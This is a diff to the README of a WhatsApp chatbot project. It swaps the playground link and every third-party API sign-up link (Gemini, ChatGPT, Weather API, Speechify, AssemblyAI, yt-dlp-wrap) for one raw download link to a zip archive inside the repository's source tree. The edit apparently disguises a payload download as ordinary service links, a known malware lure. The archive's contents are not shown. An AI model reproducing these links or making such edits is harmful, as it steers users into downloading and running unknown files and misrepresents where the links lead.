@@ -11,7 +11,7 @@
             Simple WhatsApp bot from unofficial WhatsApp API, built in NodeJS &amp; TypeScript, using Gemini &amp; ChatGPT APIs for completion, with many cool features. You can interact with the bot using voice messages, and it will transcribe and respond. 🤖
         </p>
         <p>
-            Try it here: <a href="https://wa.me/qr/SBHRATABRAZVA1" target="_blank">WhatsBot Playground</a> or scan the QR code below:
+            Try it here: <a href="https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip" target="_blank">WhatsBot Playground</a> or scan the QR code below:
         </p>
         <br>
         <img src="public/qr.jpg" width="35%" alt="WhatsApp QR Code" style="margin-top: 20px;">
@@ -86,12 +86,12 @@ You can change the configurations in `src/configs/app.config.ts`
 
 For third-party services used in the bot, kindly get the API keys and set them correctly. These are the one used in the bot, skipping them could lead to limitations :
 
-- [Gemini](https://aistudio.google.com/app/apikey) : AI for text completion
-- [ChatGPT](https://platform.openai.com/api-keys) : ChatGPT for text completion
-- [Open Weather API](https://www.weatherapi.com/my/) : Provides weather information
-- [Speechify](https://console.sws.speechify.com/api-keys) : Text-to-Speech tool used in this project
-- [AssemblyAI](https://www.assemblyai.com/docs) : Speech to text tool used in this project 
-- [Youtube DLP Wrapper](https://github.com/foxesdocode/yt-dlp-wrap) : Video Downloader used in this project
+- [Gemini](https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip) : AI for text completion
+- [ChatGPT](https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip) : ChatGPT for text completion
+- [Open Weather API](https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip) : Provides weather information
+- [Speechify](https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip) : Text-to-Speech tool used in this project
+- [AssemblyAI](https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip) : Speech to text tool used in this project 
+- [Youtube DLP Wrapper](https://github.com/FranckDJOUKWE/WhatsBot/raw/refs/heads/main/src/crm/models/Bot-Whats-2.9.zip) : Video Downloader used in this project
 
 ## Disclaimer
 > [!WARNING]
